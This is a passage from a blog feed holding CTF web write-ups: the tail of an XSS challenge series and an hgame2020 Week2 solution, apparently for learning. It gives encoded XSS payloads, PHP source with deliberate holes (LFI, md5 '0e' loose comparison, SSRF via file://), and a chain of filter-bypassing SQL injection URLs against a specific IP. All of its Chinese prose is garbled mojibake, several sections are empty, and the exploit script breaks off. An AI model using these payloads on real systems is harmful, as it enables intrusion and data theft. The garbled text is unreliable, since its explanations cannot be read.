 <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠè¾“å…¥çš„å…¨éƒ¨è¿›è¡Œå¤§å†™ï¼Œè¿™æ ·çš„è¯å‡½æ•°å’Œæ–¹æ³•å°±ä¼šå¤±æ•ˆï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨htmlç¼–ç ç»•è¿‡</p><p>è¿™é‡Œå…¶å®æœ‰ä¸€ä¸ªå…³äºæµè§ˆå™¨è§£æçš„çŸ¥è¯†ï¼Œ<code>script</code>æ ‡ç­¾å†…ä¸æ”¯æŒhtmlè§£æï¼Œåªæ”¯æŒjsè§£æï¼Œæ‰€ä»¥åœ¨scriptæ ‡ç­¾å†…ä½¿ç”¨htmlç¼–ç æ˜¯æ— æ•ˆçš„</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure><h1 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œåªæ˜¯è¿‡æ»¤äº†<code>script</code>ï¼Œç›´æ¥ç”¨ä¸Šé¢˜çš„payloadå³å¯</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure><h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><h1 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h1><p>server codeï¼š<br>payloadï¼š</p><h1 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h1><p>server codeï¼š<br>payloadï¼š</p><h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p>server codeï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•çš„å¼•ç”¨ä¸€ä¸‹ç½‘ä¸Šçš„è§£é‡Šï¼šWindow å¯¹è±¡è¡¨ç¤ºä¸€ä¸ªæµè§ˆå™¨çª—å£æˆ–ä¸€ä¸ªæ¡†æ¶ã€‚åœ¨å®¢æˆ·ç«¯ JavaScript ä¸­ï¼ŒWindowå¯¹è±¡æ˜¯å…¨å±€å¯¹è±¡ï¼Œæ‰€æœ‰çš„è¡¨è¾¾å¼éƒ½åœ¨å½“å‰çš„ç¯å¢ƒä¸­è®¡ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦å¼•ç”¨å½“å‰çª—å£æ ¹æœ¬ä¸éœ€è¦ç‰¹æ®Šçš„è¯­æ³•ï¼Œå¯ä»¥æŠŠé‚£ä¸ªçª—å£çš„å±æ€§ä½œä¸ºå…¨å±€å˜é‡æ¥ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åªå†™<code>document</code>ï¼Œè€Œä¸å¿…å†™ <code>window.document</code>ã€‚</p><p>æ‰€ä»¥è¿™é‡Œç›´æ¥ä¼ å€¼å°±å¥½äº†</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br></pre></td></tr></table></figure><h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p>server codeï¼š<br>payloadï¼š</p><h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><p>server codeï¼š<br>payloadï¼š</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xss.haozi.me/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;é¢˜ç›®å¹³å°&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/haozi/xss-demo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;é¡¹ç›®åœ°å€&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week2_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/01/26/hgame2020-Level-Week2-Web-writeup/"/>
    <id>http://0clickjacking0.github.io/2020/01/26/hgame2020-Level-Week2-Web-writeup/</id>
    <published>2020-01-26T13:49:34.000Z</published>
    <updated>2020-02-04T04:28:52.318Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week2_Web_writeup</p><a id="more"></a><h2 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œé¦–å…ˆç”¨ä¼ªåè®®è¯»å–<code>index.php</code>ï¼Œ<code>login.php</code>ï¼Œ<code>admin.php</code></p><p><code>php://filter/convert.base64-encode/resource=index.php</code></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: ?action=login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">//Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&apos;debug&apos;])) &#123;</span><br><span class="line">        $debug = $_GET[&apos;debug&apos;];</span><br><span class="line">        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmosçš„åšå®¢åå°&lt;/title&gt;</span><br><span class="line">    &lt;link href=&quot;static/signin.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;static/sticky-footer.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class=&quot;form-signin&quot; method=&quot;post&quot; action=&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class=&quot;form-signin-heading&quot;&gt;åå°ç™»é™†&lt;/h2&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;ç”¨æˆ·å&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;å¯†ç &quot; required&gt;</span><br><span class="line">        &lt;input class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer class=&quot;footer&quot;&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;text-muted&quot;&gt;Created by Annevi&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>admin.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&apos;Location: index.php&apos;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&apos;img_url&apos;])) &#123;</span><br><span class="line">        $img_url = @$_POST[&apos;img_url&apos;];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Cosmos&apos;Blog - åå°ç®¡ç†&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=&quot;logout.php&quot;&gt;é€€å‡ºç™»é™†&lt;/a&gt;</span><br><span class="line">&lt;div style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&apos;username&apos;];?&gt; &lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">        &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;/legend&gt;</span><br><span class="line">        &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type=&quot;text&quot; name=&quot;img_url&quot; placeholder=&quot;&quot;&gt;&lt;/label&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;æ’å…¥&lt;/button&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">    &lt;legend&gt;è¯„è®ºç®¡ç†&lt;/legend&gt;</span><br><span class="line">    &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;fieldset style=&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">    &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;/legend&gt;</span><br><span class="line">    &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;fieldset style=&quot;height: 50%&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">        &lt;img height=&apos;200&apos; width=&apos;500&apos; src=&apos;data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&apos;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨<code>login.php</code>ä¸­çš„<code>ç¬¬12è¡Œ</code>å­˜åœ¨ç¯å¢ƒå˜é‡çš„è¯»å–ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°usernameå’Œmd5åŠ å¯†åçš„å¯†ç å€¼</p><p><img src="http://images.xianyu123.club/Cosmos_blog1.png" alt></p><p>æˆ‘ä»¬æ¥ç€çœ‹<code>login.php</code>çš„<code>ç¬¬22è¡Œ</code>ï¼Œè¿™é‡Œå¯†ç æ¯”è¾ƒæ˜¯å­˜åœ¨å¼±ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨åŠ å¯†åä¹Ÿæ˜¯<code>0e</code>å¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ç»•è¿‡</p><p><img src="http://images.xianyu123.club/Cosmos_blog2.png" alt></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹<code>admin.php</code>ï¼Œè¿™é‡Œhostå¿…é¡»ä¸ºlocalhostï¼Œä¸”å¯ä»¥ä½¿ç”¨ä»»ä½•åè®®ï¼Œç›´æ¥ç”¨fileåè®®è¿›è¡Œè¯»å–</p><p><img src="http://images.xianyu123.club/Cosmos_blog3.png" alt></p><p>ç„¶åè¿›è¡Œbase64è§£ç å³å¯</p><h2 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h2><p>é€šè¿‡fuzzåˆ¤æ–­è¿™é‡ŒæŠŠ<code>select</code>å’Œç©ºæ ¼æ›¿æ¢ä¸ºç©ºäº†</p><p><code>select</code>ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=&apos;^(length(&apos;selselectect&apos;)=6)^&apos;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=&apos;^(length(&apos;%20&apos;)=1)^&apos;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µï¼Œè¿™é‡Œåªæœ‰ä¸€ä¸ªå­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aorder%0aby%0a1%23</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯æ˜¾å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(1)%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0adatabase()%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢è¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(sselectelect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database())%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(seleselectct%0a*%0afrom%0aeasysql.f1aggggggggggggg)%23</span><br></pre></td></tr></table></figure><h2 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h2><p><code>index.php</code>é¡µé¢å†…å®¹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = file_get_contents(<span class="string">'mycode'</span>);</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure><p>fuzzçŒœæµ‹<code>/mycode</code>æœç„¶å­˜åœ¨ï¼Œå¦‚ä¸‹</p><p><img src="http://images.xianyu123.club/Cosmos_new_language1.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(encrypt(strrev(str_rot13(base64_encode(str_rot13(encrypt(strrev(strrev(base64_encode($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è§£å¯†ï¼Œè¿™é‡Œ<code>python</code>æ¶‰åŠåˆ°ç¼–ç è½¬æ¢é—®é¢˜ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨<code>php</code>æ¥é€†å‘è§£å¯†ï¼Œå…³é”®é—®é¢˜æ˜¯<code>code</code>ä»£ç ä¸­çš„è§£å¯†éƒ¨åˆ†ä¼šä¸€ç›´æ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦å…ˆæŠ“å–ï¼Œå…¶ä»–å°±æŒ‰ä¸€èˆ¬æ­¥éª¤æ¥å°±å¥½äº†ï¼Œä¸‹é¢æ˜¯æˆ‘çš„<code>exp</code>ã€‚æœ‰å¯èƒ½ç¬¬ä¸€æ¬¡è·‘ä¸å‡ºflagï¼Œå¤šè¿è¡Œå‡ éä»£ç å°±å¯ä»¥å‡ºflagäº†</p><p><code>exp.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 